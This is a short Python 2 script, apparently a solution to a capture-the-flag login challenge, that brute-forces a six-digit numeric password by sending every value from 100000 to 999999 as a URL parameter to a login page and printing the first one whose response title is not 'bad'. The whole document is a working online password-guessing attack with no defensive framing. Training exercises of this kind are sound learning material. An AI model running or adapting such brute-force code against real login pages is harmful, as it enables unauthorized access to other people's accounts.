#-*- encoding: utf-8 -*-
import urllib2,urllib,re
url = 'http://challenge.honyaedu.com:8886/hou15/10/login.php'
rule = '<title>bad<\/title>'
for passw in range(100000,1000000):
	passw = str(passw)
	Url = url+'?password='+passw+'&Submit='+'%E7%A1%AE%E5%AE%9A'
	response = urllib2.urlopen(Url,timeout=10)
	the_page = response.read()
	s = re.match(rule,the_page)
	if s:
		continue
	else:
		print passw
		break
